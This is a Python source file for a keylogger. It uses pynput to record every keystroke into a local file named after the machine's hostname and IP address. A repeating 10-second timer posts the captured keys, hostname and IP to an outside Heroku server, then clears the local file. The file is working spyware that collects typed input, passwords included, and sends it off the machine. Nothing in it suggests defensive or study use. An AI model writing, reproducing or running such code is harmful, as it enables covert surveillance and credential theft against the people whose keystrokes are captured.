from pynput import keyboard
import os
import json
import requests
import socket
import threading
## getting the hostname by socket.gethostname() method
hostname = socket.gethostname()
## getting the IP address using socket.gethostbyname() method
ip_address = socket.gethostbyname(hostname)

url = 'https://keypress-logger.herokuapp.com/'

file_name=str(hostname)+"_"+str(ip_address)
f = open(file_name,'w')
f.close()

def send_data():
    f1 = open(file_name,'r+')
    size=os.path.getsize(file_name)
    if size > 100:
        myjson={"ip":ip_address,"hostname":hostname,"keys":f1.read()}
        try:
            x=requests.post(url,data=myjson)
            f1.truncate(0)
        except:
            print("Not connected to server yet!..")
    f1.close()

def timer():
    send_data()
    t=threading.Timer(10,timer)
    t.start()

timer()

def on_press(key):
    try:
        #print('alphanumeric key {0} pressed'.format(key.char))
        text=str(key)
        f1 = open(file_name,'a')
        f1.write(text)
        f1.close()
        print(text)
    except AttributeError:
        pass

def on_release(key):
    #print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False


# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()
